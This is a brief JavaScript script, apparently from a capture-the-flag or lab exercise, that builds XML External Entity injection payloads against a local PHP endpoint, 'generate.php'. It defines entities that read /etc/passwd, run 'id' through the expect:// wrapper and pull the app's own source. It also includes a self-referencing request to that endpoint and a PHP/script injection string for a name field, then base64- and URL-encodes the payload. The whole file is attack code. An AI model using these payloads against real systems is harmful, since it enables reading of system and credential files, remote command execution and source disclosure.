firstName = "<?php\
  echo '<script>console.log(\'lol\');</script>';\
?>";

system = '\'file:///var/www/html/generate.php\'';
path = '\'http://localhost/generate.php?input=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4gIDwhRE9DVFlQRSBvd24gWyA8IUVMRU1FTlQgb3duIEFOWSA%2BICA8IUVOVElUWSBvd24gU1lTVEVNICdmaWxlOi8vL3Zhci93d3cvaHRtbC9nZW5lcmF0ZS5waHAnID5dPiAgPGlucHV0PiAgICA8Zmlyc3ROYW1lPiZvd247PC9maXJzdE5hbWU%2BICAgIDxsYXN0TmFtZT5BbiBQaGFtPC9sYXN0TmFtZT4gIDwvaW5wdXQ%2BICA%3D\'';

passwd = '\'file:///etc/passwd\'';
expect = '\'expect://id\'';

lastName = "Bi";
s = "<?xml version='1.0' encoding='UTF-8'?>\
  <!DOCTYPE own [ <!ELEMENT own ANY >\
  <!ENTITY own SYSTEM " + passwd + " >]>\
  <input>\
    <firstName>&own;</firstName>\
    <lastName>An Pham</lastName>\
  </input>\
  ";

buf = Buffer.from(s).toString('base64');
console.log(encodeURIComponent(buf));

// test = 'PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ%2BPGZpcnN0TmFtZT54PC9maXJzdE5hbWU%2BPGxhc3ROYW1lPng8L2xhc3ROYW1lPjwvaW5wdXQ%2B'
// console.log(Buffer.from(test, 'base64').toString('utf8'));
